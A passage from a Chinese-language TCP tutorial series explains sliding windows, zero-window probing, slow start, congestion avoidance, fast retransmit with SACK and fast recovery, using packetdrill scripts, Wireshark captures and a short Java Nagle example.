- 重传情况下不用测量的 RTT 来更新 SRTT 和 RTTVAR
- 出现重传时 RTO 采用指数级退避的方式，直到后续包出现不需要重传就可以收到确认为止

这篇文章我们来开始介绍 TCP 的滑动窗口。滑动窗口的一个非常重要的概念，是理解 TCP 精髓的关键，下面来开始这部分的内容吧。

如果从 socket 的角度来看TCP，是下面这样的



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8f55a26130ef3)



TCP 会把要发送的数据放入发送缓冲区（Send Buffer)，接收到的数据放入接收缓冲区（Receive Buffer），应用程序会不停的读取接收缓冲区的内容进行处理。

流量控制做的事情就是，如果接收缓冲区已满，发送端应该停止发送数据。那发送端怎么知道接收端缓冲区是否已满呢？

为了控制发送端的速率，接收端会告知客户端自己接收窗口（rwnd），也就是接收缓冲区中空闲的部分。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8f55a26a6a568)



TCP 在收到数据包回复的 ACK 包里会带上自己接收窗口的大小，接收端需要根据这个值调整自己的发送策略。

## 发送窗口与接收窗口

一个非常容易混淆的概念是「发送窗口」和「接收窗口」，很多人会认为接收窗口就是发送窗口。

先来问一个问题，wireshark 抓包中显示的 win=29312 指的是「发送窗口」的大小吗？



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b8f55a25d71532)



当然不是的，其实这里的 win 表示向对方声明自己的接收窗口的大小，对方收到以后，会把自己的「发送窗口」限制在 29312 大小之内。如果自己的处理能力有限，导致自己的接收缓冲区满，接收窗口大小为 0，发送端应该停止发送数据。

## TCP 包状态分类

从 TCP 角度而言，数据包的状态可以分为如下图的四种

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005b1f1b27a)



- 粉色部分#1 (Bytes Sent and Acknowledged)：表示已发送且已收到 ACK 确认的数据包。
- 蓝色部分#2 (Bytes Sent but Not Yet Acknowledged)：表示已发送但未收到 ACK 的数据包。发送方不确定这部分数据对端有没有收到，如果在一段时间内没有收到 ACK，发送端需要重传这部分数据包。
- 绿色部分#3 (Bytes Not Yet Sent for Which Recipient Is Ready)：表示未发送但接收端已经准备就绪可以接收的数据包（有空间可以接收）
- 黄色部分#4 (Bytes Sent and Acknowledged)：表示还未发送，且这部分接收端没有空间接收

## 发送窗口（send window）与可用窗口（usable window）

**发送窗口**是 TCP 滑动窗口的核心概念，它表示了在某个时刻一端能拥有的最大未确认的数据包大小（最大在途数据），发送窗口是发送端被允许发送的最大数据包大小，其大小等于上图中 #2 区域和 #3 区域加起来的总大小

**可用窗口**是发送端还能发送的最大数据包大小，它等于发送窗口的大小减去在途数据包大小，是发送端还能发送的最大数据包大小，对应于上图中的 #3 号区域

窗口的左边界表示**成功发送并已经被接收方确认的最大字节序号**，窗口的右边界是**发送方当前可以发送的最大字节序号**，滑动窗口的大小等于右边界减去左边界。

如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005b25d3742)



当上图中的可用区域的6个字节（46~51）发送出去，可用窗口区域减小到 0，这个时候除非收到接收端的 ACK 数据，否则发送端将不能发送数据。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005af94206a)



我们用 packetdrill 复现上面的现象

```
--tolerance_usecs=100000
0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
// 禁用 nagle 算法
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

// 三次握手
+0  < S 0:0(0) win 20 <mss 1000>
+0  > S. 0:0(0) ack 1 <...>
+.1 < . 1:1(0) ack 1 win 20
+0  accept(3, ..., ...) = 4

// 演示已经发送并 ACK 前 31 字节数据
+.1  write(4, ..., 15) = 15
+0 < . 1:1(0) ack 16 win 20
+.1  write(4, ..., 16) = 16
+0 < . 1:1(0) ack 32 win 20

+0  write(4, ..., 14) = 14
+0  write(4, ..., 6) = 6

+.1 < . 1:1(0) ack 52 win 20

+0 `sleep 1000000`
```

解析如下：

- 一开始我们禁用了 Nagle 算法以便后面可以连续发送包。
- 三次握手以后，客户端声明自己的窗口大小为 20 字节
- 通过两次发包和确认前 31 字节的数据
- 发送端发送(32,46)部分的 14 字节数据，滑动窗口的可用窗口变为 6
- 发送端发送(46,52)部分的 6 字节数据，滑动窗口的可用窗口变为 0，此时发送端不能往接收端发送任何数据了，除非有新的 ACK 到来
- 接收端确认(32,52)部分 20 字节的数据，可用窗口重现变为 20

滑动窗口变化过程如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005b2bd48c6)



这个过程抓包的结果如下图：



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005b39a3c21)



抓包显示的 **TCP Window Full**不是一个 TCP 的标记，而是 wireshark 智能帮忙分析出来的，表示**包的发送方已经把对方所声明的接收窗口耗尽了**，三次握手中客户端声明自己的接收窗口大小为 20，这意味着发送端最多只能给它发送 20 个字节的数据而无需确认，**在途字节数**最多只能为 20 个字节。

## TCP window full

我们用 packetdrill 再来模拟这种情况：三次握手中接收端告诉自己它的接收窗口为 4000，如果这个时候发送端发送 5000 个字节的数据，会发生什么呢？

是会发送 5000 个字节出去，还是 4000 字节？

脚本内容如下：

```
--tolerance_usecs=100000
0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

// 三次握手告诉客户端告诉服务器自己的接收窗口大小为 4000
+0  < S 0:0(0) win 4000 <mss 1000>
+0  > S. 0:0(0) ack 1 <...>
+.1 < . 1:1(0) ack 1 win 4000
+0  accept(3, ..., ...) = 4

// 写客户端写 5000 字节数据
+0  write(4, ..., 5000) = 5000

+0 `sleep 1000000`
```

抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005b840dc66)



可以看到，因为 MSS 为 1000，每次发包的大小为 1000，总共发了 4 次以后在途数据包字节数为 4000，再发数据就会超过接收窗口的大小了，于是发送端暂停改了发送，等待在途数据包的确认。

过程如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16968005f3a87de2)



## TCP Zero Window

TCP 包中`win=`表示接收窗口的大小，表示接收端还有多少缓冲区可以接收数据，当窗口变成 0 时，表示接收端不能暂时不能再接收数据了。 我们来看一个实际的例子，如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1696a7c75c1fad31)



逐个解释一下

一开始三次握手确定接收窗口大小为 360 字节。

第一步：发送端发送 140 字节给接收端，此时因为 140 字节在途未确认，所以它的**可用滑动窗口大小**为：360 - 140 = 220

第二步：接收端收到 140 字节以后，将这 140 字节放入TCP 接收区缓冲队列。

正常情况下，接收端处理的速度非常快，这 140 字节会马上被应用层取走并释放这部分缓冲区，同时发送确认包给发送端，这样接收端的窗口大小（RCV.WND)马上可以恢复到 360 字节，发送端收到确认包以后也马上将可用发送滑动窗口恢复到 360 字节。

但是如果因为高负载等原因，导致 TCP 没有立马处理接收到的数据包，收到的 140 字节没能全部被取走，这个时候 TCP 会在返回的 ACK 里携带它建议的接收窗口大小，因为自己的处理能力有限，那就告诉对方下次发少一点数据嘛。假设如上图的场景，收到了 140 字节数据，现在只能从缓冲区队列取走 40 字节，还剩下 100 字节留在缓冲队列中，接收端将接收窗口从原来的 360 减小 100 变为 260。

第三步：发送端接收到 ACK 以后，根据接收端的指示，将自己的发送滑动窗口减小到 260。所有的数据都已经被确认，这时候可用窗口大小也等于 260

第四步：发送端继续发送 180 字节的数据给接收端，可用窗口= 260 - 180 = 80。

第五步：接收端收到 180 字节的数据，因为负载高等原因，只能取走 80 字节的数据，留下 100 字节在缓冲区队列，将接收窗口再降低 100，变为 80，在回复给对端的 ACK 里携带回去。

第六步：发送端收到 ACK 以后，将自己的发送窗口减小到 80，同时可用窗口也变为 80

第七步：发送端继续发送 80 字节数据给接收端，在未确认之前在途字节数为 80，发送端可用窗口变为 0

第八步：接收端收到 80 字节的数据，放入接收区缓冲队列，但是入之前原因，没能取走，滑动窗口进一步减小到 0，在回复的 ACK 里捎带回去

第九步：发送端收到 ACK，根据发送端的指示，将自己的滑动窗口总大小减小为 0

思考一个问题：现在发送端的滑动窗口变为 0 了，经过一段时间接收端从高负载中缓过来，可以处理更多的数据包，如果发送端不知道这个情况，它就会永远傻傻的等待了。于是乎，TCP 又设计了零窗口探测的机制（Zero window probe），用来向接收端探测，你的接收窗口变大了吗？我可以发数据了吗？

**零窗口探测包**其实就是一个 ACK 包，下面根据抓包进行详细介绍

我们用 packetdrill 来完美模拟上述的过程

```
--tolerance_usecs=100000
0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0  < S 0:0(0) win 4000 <mss 1000>
+0  > S. 0:0(0) ack 1 <...>
// 三次握手确定客户端接收窗口大小为 360
+.1 < . 1:1(0) ack 1 win 360
+0  accept(3, ..., ...) = 4

// 第一步：往客户端（接收端）写 140 字节数据
+0  write(4, ..., 140) = 140
// 第二步：模拟客户端回复 ACK，接收端滑动窗口减小为 260
+.01 < . 1:1(0) ack 141 win 260
// 第四步：服务端（发送端）接续发送 180 字节数据给客户端（接收端）
+0  write(4, ..., 180) = 180
// 第五步：模拟客户端回复 ACK，接收端滑动窗口减小到 80
+.01 < . 1:1(0) ack 321 win 80
// 第七步：服务端（发送端）继续发送 80 字节给客户端（接收端）
+0  write(4, ..., 80) = 80
// 第八步：模拟客户端回复 ACK，接收端滑动窗口减小到 0
+.01 < . 1:1(0) ack 401 win 0

+0 `sleep 1000000`
```

抓包结果如下：



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/1696d4564ca57929)



可以看到

- No = 8 的包，发送端发送 80 以后，自己已经把接收端声明的接收窗口大小耗尽了，wireshark 帮我们把这种行为识别为了 TCP Window Full。
- No = 9 的包，是接收端回复的 ACK，携带了 win=0，wireshark 帮忙把这个包标记为了 TCP Zero window
- No = 10 ~ 25 的包就是我们前面提到的TCP Zero Window Probe，但是 wireshark 这里识别这个包为了 Keep-Alive，之所以被识别为Keep-Alive 是因为这个包跟 Keep-Alive 包很像。这个包的特点是：**一个长度为 0 的 ACK 包，Seq 为当前连接 Seq 最大值减一**。因为发出的探测包一直没有得到回应，所以会一直发送端会一直重试。重试的策略跟前面介绍的超时重传的机制一样，时间间隔遵循指数级退避，最大时间间隔为 120s，重试了 16，总共花费了 16 分钟

## 有等待重试的地方就有攻击的可能

与之前介绍的 Syn Flood 攻击类似，上面的零窗口探测也会成为攻击的对象。试想一下，一个客户端利用服务器上现有的大文件，向服务器发起下载文件的请求，在接收少量几个字节以后把自己的 window 设置为 0，不再接收文件，服务端就会开始漫长的十几分钟时间的零窗口探测，如果有大量的客户端对服务端执行这种攻击操作，那么服务端资源很快就被消耗殆尽。

## TCP window full 与 TCP zero window

这两者都是发送速率控制的手段，

- TCP Window Full 是站在**发送端**角度说的，表示在途字节数等于对方接收窗口的情况，此时发送端不能再发数据给对方直到发送的数据包得到 ACK。
- TCP zero window 是站在**接收端**角度来说的，是接收端接收窗口满，告知对方不能再发送数据给自己。

## 作业题

1、关于 TCP 的滑动窗口,下面哪些描述是错误的?

- A、发送端不需要传输完整的窗口大小的报文
- B、TCP 滑动窗口允许在收到确认之前发送多个数据包
- C、重传计时器超时后,发送端还没有收到确认，会重传未被确认的数据
- D、发送端不宣告初始窗口大小

2、TCP使用滑动窗口进行流量控制，流量控制实际上是对（ ）的控制。

- A、发送方数据流量
- B、接收方数据流量
- C、发送、接收方数据流量
- D、链路上任意两节点间的数据流量

前面的文章介绍了 TCP 利用滑动窗口来做流量控制，但流量控制这种机制确实可以防止发送端向接收端过多的发送数据，但是它只关注了发送端和接收端自身的状况，而没有考虑整个网络的通信状况。于是出现了我们今天要讲的拥塞处理。

拥塞处理主要涉及到下面这几个算法

- 慢启动（Slow Start）
- 拥塞避免（Congestion Avoidance）
- 快速重传（Fast Retransmit）和快速恢复（Fast Recovery）

为了实现上面的算法，TCP 的每条连接都有两个核心状态值：

- 拥塞窗口（Congestion Window，cwnd）
- 慢启动阈值（Slow Start Threshold，ssthresh）

## 拥塞窗口（Congestion Window，cwnd）

拥塞窗口指的是在收到对端 ACK 之前自己还能传输的最大 MSS 段数。

它与前面介绍的接收窗口（rwnd）有什么区别呢？

- 接收窗口（rwnd）是**接收端**的限制，是接收端还能接收的数据量大小
- 拥塞窗口（cwnd）是**发送端**的限制，是发送端在还未收到对端 ACK 之前还能发送的数据量大小

我们在 TCP 头部看到的 window 字段其实讲的接收窗口（rwnd）大小。

拥塞窗口初始值等于操作系统的一个变量 initcwnd，最新的 linux 系统 initcwnd 默认值等于 10。

拥塞窗口与前面介绍的发送窗口（Send Window）又有什么关系呢？

真正的发送窗口大小 = 「接收端接收窗口大小」 与 「发送端自己拥塞窗口大小」 两者的最小值

如果接收窗口比拥塞窗口小，表示接收端处理能力不够。如果拥塞窗口小于接收窗口，表示接收端处理能力 ok，但网络拥塞。

这也很好理解，发送端能发送多少数据，取决于两个因素

- 对方能接收多少数据（接收窗口）
- 自己为了避免网络拥塞主动控制不要发送过多的数据（拥塞窗口）

发送端和接收端不会交换 cwnd 这个值，这个值是维护在发送端本地内存中的一个值，发送端和接收端最大的在途字节数（未经确认的）数据包大小只能是 rwnd 和 cwnd 的最小值。

拥塞控制的算法的本质是控制拥塞窗口（cwnd）的变化。

------

## 拥塞处理算法一：慢启动

在连接建立之初，应该发多少数据给接收端才是合适的呢？

你不知道对端有多快，如果有足够的带宽，你可以选择用最快的速度传输数据，但是如果是一个缓慢的移动网络呢？如果发送的数据过多，只是造成更大的网络延迟。这是基于整个考虑，每个 TCP 连接都有一个拥塞窗口的限制，最初这个值很小，随着时间的推移，每次发送的数据量如果在不丢包的情况下，“慢慢”的递增，这种机制被称为「慢启动」

拥塞控制是从整个网络的大局观来思考的，如果没有拥塞控制，某一时刻网络的时延增加、丢包频繁，发送端疯狂重传，会造成网络更重的负担，而更重的负担会造成更多的时延和丢包，形成雪崩的网络风暴。

这个算法的过程如下：

- 第一步，三次握手以后，双方通过 ACK 告诉了对方自己的接收窗口（rwnd）的大小，之后就可以互相发数据了

- 第二步，通信双方各自初始化自己的「拥塞窗口」（Congestion Window，cwnd）大小。

- 第三步，cwnd 初始值较小时，每收到一个 ACK，cwnd + 1，每经过一个 RTT，cwnd 变为之前的两倍。 过程如下图

    ![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a09647a07ea)

在初始拥塞窗口为 10 的情况下，拥塞窗口随时间的变化关系如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a0965069dbd)



因此可以得到拥塞窗口达到 N 所花费的时间公式为：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a095a9789a3)



假设 RTT 为 50ms，客户端和服务端的接收窗口为65535字节（64KB），初始拥塞窗口为：10段，那么要达到 64KB 的吞吐量，拥塞窗口的段数 = 65535 / 1460 = 45 段，需要的 RTT 次数 = log2（45 / 10）= 2.12 次，需要的时间 = 50 * 2.12 = 106ms。也就是客户端和服务器之间的 64KB 的吞吐量，需要 2.12 次 RTT，100ms 左右的延迟。

早期的 Linux 的初始 cwnd 为 4，在这种情况下，需要 3.35 次 RTT，花费的实际就更长了。如果客户端和服务器之间的 RTT 很小，则这个时间基本可以忽略不计

## 使用 packetdrill 来演示慢启动的过程

我们用 packetdrill 脚本的方式来看慢启动的过程。模拟服务端 8080 端口往客户端传送 100000 字节的数据，客户端的 MSS 大小为1000。

```
+0  write(4, ..., 100000) = 100000
```

packetdrill 脚本内容如下

```
--tolerance_usecs=1000000
0 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
+0 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+0 bind(3, ..., ...) = 0
+0 listen(3, 1) = 0

+0  < S 0:0(0) win 65535  <mss 100>
+0  > S. 0:0(0) ack 1 <...>
+.1 < . 1:1(0) ack 1 win 65535

+.1  accept(3, ..., ...) = 4

// 往客户端写 20000 字节数据
+.3  write(4, ..., 20000)  = 20000
// 预期内核会发出 10 段 MSS 数据，下面是 10 次断言
+0 > . 1:101(100) ack 1 <...>
+0 > . 101:201(100) ack 1 <...>
+0 > . 201:301(100) ack 1 <...>
+0 > . 301:401(100) ack 1 <...>
+0 > . 401:501(100) ack 1 <...>
+0 > . 501:601(100) ack 1 <...>
+0 > . 601:701(100) ack 1 <...>
+0 > . 701:801(100) ack 1 <...>
+0 > . 801:901(100) ack 1 <...>
+0 > . 901:1001(100) ack 1 <...>

+0 `sleep 1000000`
```

**第 1 步**：首先通过抓包确定，是不是符合我们的预期，拥塞窗口 cwnd 为 10 ，第一次会发 10 段 MSS 的数据包，抓包结果如下。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a095aa5c428)



可以看到服务器一口气发了 10 段数据，然后等待客户端回复 ACK，因为我们没有写回复ACK 的代码，所以过了 300ms 以后开始重传了。

**第 2 步**：确认这 10 段数据 在 write 调用后面增加确认 10 个段数据的脚本。理论上拥塞窗口 cwnd 会从 10 变为 20，预期内核会发出 20 段数据

```
+.1 < . 1:1(0) ack 1001 win 65535
// 预期会发出 20 段 MSS，下面是 20 次断言
+0 > . 1001:1101(100) ack 1 <...>
+0 > . 1101:1201(100) ack 1 <...>
+0 > . 1201:1301(100) ack 1 <...>
+0 > . 1301:1401(100) ack 1 <...>
+0 > . 1401:1501(100) ack 1 <...>
+0 > . 1501:1601(100) ack 1 <...>
+0 > . 1601:1701(100) ack 1 <...>
+0 > . 1701:1801(100) ack 1 <...>
+0 > . 1801:1901(100) ack 1 <...>
+0 > . 1901:2001(100) ack 1 <...>
+0 > . 2001:2101(100) ack 1 <...>
+0 > . 2101:2201(100) ack 1 <...>
+0 > . 2201:2301(100) ack 1 <...>
+0 > . 2301:2401(100) ack 1 <...>
+0 > . 2401:2501(100) ack 1 <...>
+0 > . 2501:2601(100) ack 1 <...>
+0 > . 2601:2701(100) ack 1 <...>
+0 > . 2701:2801(100) ack 1 <...>
+0 > . 2801:2901(100) ack 1 <...>
+0 > . 2901:3001(100) ack 1 <...>
```

重新执行抓包，可以看到这次服务端发送了 20 段长度为 MSS 的数据

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a0965962377)



**第 3 步**：确认发送的 20 段数据 再确认发送的 20 段数据，看看内核会发送出多少数据

```
// 确认这 20 段数据
+.2 < . 1:1(0) ack 3001 win 65535

// 预期会发出 40 段 MSS 数据，下面是 40 次断言
+0 > . 3001:3101(100) ack 1 <...>
+0 > . 3101:3201(100) ack 1 <...>
// 中间省略若干行
+0 > . 6701:6801(100) ack 1 <...>
+0 > . 6801:6901(100) ack 1 <...>
+0 > . 6901:7001(100) ack 1 <...>
```

抓包结果如下，可以看到这下服务器发送了 40 段数据

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a096c8c8c5e)



第 4 步，确认发送的 40 段数据，理论上应该会发送 80 段数据，包序号区间：7001 ~ 15001

```
+.2 < . 1:1(0) ack 7001 win 65535
```

抓包结果如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a0a33f88e86)



上面的过程通过抓包的方式来验证了慢启动指数级增大拥塞窗口 cwnd 的过程。

## 慢启动阈值（Slow Start Threshold，ssthresh）

慢启动拥塞窗口（cwnd）肯定不能无止境的指数级增长下去，否则拥塞控制就变成了「拥塞失控」了，它的阈值称为「慢启动阈值」（Slow Start Threshold，ssthresh），这是文章开头介绍的拥塞控制的第二个核心状态值。ssthresh 就是一道刹车，让拥塞窗口别涨那么快。

- 当 cwnd < ssthresh 时，拥塞窗口按指数级增长（慢启动）
- 当 cwnd > ssthresh 时，拥塞窗口按线性增长（拥塞避免）

## 拥塞避免（Congestion Avoidance）

当 cwnd > ssthresh 时，拥塞窗口进入「拥塞避免」阶段，在这个阶段，每一个往返 RTT，拥塞窗口大约增加 1 个 MSS 大小，直到检测到拥塞为止。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a1126f794fdf38)



与慢启动的区别在于

- 慢启动的做法是 RTT 时间内每收到一个 ACK，拥塞窗口 cwnd 就加 1，也就是每经过 1 个 RTT，cwnd 翻倍
- 拥塞避免的做法保守的多，每经过一个RTT 才将拥塞窗口加 1，不管期间收到多少个 ACK



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a1126f7a2a0841)



实际的算法是如下：，

- 每收到一个 ACK，将拥塞窗口增加一点点（1 / cwnd）：cwnd += 1 / cwnd
- 

以初始 cwnd = 1 为例，cwnd 变化的过程如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a1126f8a9442d0)



所以是每经过 1 个 RTT，拥塞窗口「大约」增加 1

------

前面介绍的慢启动和拥塞避免是 1988 年提出的拥塞控制方案，在 1990 年又出现了两种新的拥塞控制方案：「快速重传」和「快速恢复」

## 算法三：快速重传（Fast Retransmit)

之前重传的文章中我们介绍重传的时间间隔，要等几百毫秒才会进行第一次重传。聪明的网络协议设计者们想到了一种方法：**「快速重传」**

快速重传的含义是：当接收端收到一个不按序到达的数据段时，TCP 立刻发送 1 个重复 ACK，而不用等有数据捎带确认，当发送端收到 3 个或以上重复 ACK，就意识到之前发的包可能丢了，于是马上进行重传，不用傻傻的等到重传定时器超时再重传。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a1126f8b4307c8)



## 选择确认（Selective Acknowledgment，SACK）

这个有一个问题，发送 3、4、5 包收到的全部是 ACK=1001，快速重传解决了一个问题: 需要重传。因为除了 2 号包，3、4、5 包也有可能丢失，那到底是只重传数据包 2 还是重传 2、3、4、5 所有包呢？

聪明的网络协议设计者，想到了一个好办法

- 收到 3 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:3001] 区间的包我也收到了
- 收到 4 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:4001] 区间的包我也收到了
- 收到 5 号包的时候在 ACK 包中告诉发送端：喂，小老弟，我目前收到的最大连续的包序号是 **1000**（ACK=1001），[1:1001]、[2001:5001] 区间的包我也收到了

这样发送端就清楚知道只用重传 2 号数据包就可以了，数据包 3、4、5已经确认无误被对端收到。这种方式被称为 SACK（Selective Acknowledgment）。

如下图所示：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a1126f8b380ed9)



## 使用 packetdrill 演示快速重传

```
  1 --tolerance_usecs=100000
  // 常规操作：初始化
  2 0  socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
  3 +0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
  4 +0 bind(3, ..., ...) = 0
  5 +0 listen(3, 1) = 0
  6
  7 +0  < S 0:0(0) win 32792 <mss 1000,sackOK,nop,nop,nop,wscale 7>
  8 +0  > S. 0:0(0) ack 1 <...>
  9 +.1 < . 1:1(0) ack 1 win 257
 10
 11 +0 accept(3, ... , ...) = 4
 12 // 往客户端写 5000 字节数据
 13 +0.1 write(4, ..., 5000) = 5000
 14
 15 +.1 < . 1:1(0) ack 1001 win 257 <sack 1:1001,nop,nop>
 // 三次重复 ack
 16 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:3001,nop,nop>
 17 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:4001,nop,nop>
 18 +0  < . 1:1(0) ack 1001 win 257 <sack 1:1001 2001:5001,nop,nop>
 19 // 回复确认包，让服务端不再重试
 20 +.1 < . 1:1(0) ack 5001 win 257
 21
 22 +0 `sleep 1000000`
```

用 tcpdump 抓包以供 wireshark 分析`sudo tcpdump -i any port 8080 -nn -A -w fast_retran.pcap`，使用 packetdrill 执行上面的脚本。 可以看到，完全符合我们的预期，3 次重复 ACK 以后，过了15微妙，立刻进行了重传



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02c07dfb145ee)



打开单个包的详情，在 ACK 包的 option 选项里，包含了 SACK 的信息，如下图：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a02c07dfc0ce58)



## 算法四：快速恢复

当收到三次重复 ACK 时，进入快速恢复阶段。解释为网络轻度拥塞。

- 拥塞阈值 ssthresh 降低为 cwnd 的一半：ssthresh = cwnd / 2
- 拥塞窗口 cwnd 设置为 ssthresh
- 拥塞窗口线性增加

## 慢启动、快速恢复中的快慢是什么意思

刚开始学习这部内容的时候，有一个疑惑，明明慢启动拥塞窗口是成指数级增长，那还叫慢？快速恢复拥塞窗口增长的这么慢，还叫快速恢复？

我的理解是慢和快不是指的拥塞窗口增长的速度，而是指它们的初始值。慢启动初始值一般都很小，快速恢复的 cwnd 设置为 ssthresh

## 演示丢包

下面我们来演示出现丢包重传时候，拥塞窗口变化情况

```
// 回复这 10 段数据
+.2 < . 1:1(0) ack 1001 win 65535

// 预期会发出 20 段 MSS
+0 > . 1001:1101(100) ack 1 <...>
// ... 省略若干行
+0 > . 2901:3001(100) ack 1 <...>


// 过 3 秒再回复这 20 段数据，模拟网络延迟，发送端会在这期间重传
+3 < . 1:1(0) ack 3001 win 65535
```

这种情况下，我们来抓包看一下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a04a0a2807cbd2)



本来应该发送 40 段数据的，实际上只发送了 20 段，因为 TCP 这个时候已经知道网络可能已经出现拥塞，如果发送更大量的数据，会加重拥塞。

拥塞避免把丢包当做网络拥塞的标志，如果出现了丢包的情况，必须调整窗口的大小，避免更多的包丢失。

拥塞避免是一个很复杂的话题，有很多种算法：TCP Reno、TCP new Reno、TCP Vegas、TCP CUBIC等，这里不做太多的展开。

## 为什么初始化拥塞窗口 initcwnd 是 10

最初的 TCP 初始拥塞窗口值为 3 或者 4，大于 4KB 左右，如今常见的 web 服务数据流都较短，比如一个页面只有 4k ~ 6k，在慢启动阶段，还没达到传输峰值，整个数据流就可能已经结束了。对于大文件传输，慢启动没有什么问题，慢启动造成的时延会被均摊到漫长的传输过程中。

根据 Google 的研究，90% 的 HTTP 请求数据都在 16KB 以内，约为 10 个 TCP 段。再大比如 16，在某些地区会出现明显的丢包，因此 10 是一个比较合理的值。

## 小结

这篇文章主要以实际的案例讲解了拥塞控制的几种算法：

- 慢启动：拥塞窗口一开始是一个很小的值，然后每 RTT 时间翻倍
- 拥塞避免：当拥塞窗口达到拥塞阈值（ssthresh）时，拥塞窗口从指数增长变为线性增长
- 快速重传：发送端接收到 3 个重复 ACK 时立即进行重传
- 快速恢复：当收到三次重复 ACK 时，进入快速恢复阶段，此时拥塞阈值降为之前的一半，然后进入线性增长阶段

## 做一道练习题

设 TCP 的 ssthresh （慢开始门限）的初始值为 8 （单位为报文段）。当拥塞窗口上升到 12 时网络发生了超时，TCP 使用慢开始和拥塞避免。试分别求出第 1 次到第 15 次传输的各拥塞窗口大小。

从这篇文章开始，我们来讲大名鼎鼎的 Nagle 算法。同样以一个小测验来开始。

关于下面这段代码

```
Socket socket = new Socket();
socket.connect(new InetSocketAddress("localhost", 9999));
OutputStream output = socket.getOutputStream();
byte[] request = new byte[10];
for (int i = 0; i < 5; i++) {
    output.write(request);
}
```

说法正确的是：

- A. TCP 把 5 个包合并，一次发送 50 个字节
- B. TCP 分 5 次发送，一次发送 10 个字节
- C. 以上都不对

来做一下实验，客户端代码如下

```
public class NagleClient {
    public static void main(String[] args) throws Exception {
        Socket socket = new Socket();
        SocketAddress address = new InetSocketAddress("c1", 9999);
        socket.connect(address);
        OutputStream output = socket.getOutputStream();
        byte[] request = new byte[10];
        // 分 5 次发送 5 个小包
        for (int i = 0; i < 5; i++) {
            output.write(request);
        }
        TimeUnit.SECONDS.sleep(1);
        socket.close();
    }
}
```

服务端代码比较简单，可以直接用 `nc -l 9999` 启动一个 tcp 服务器 运行上面的 NagleClient，抓包如下

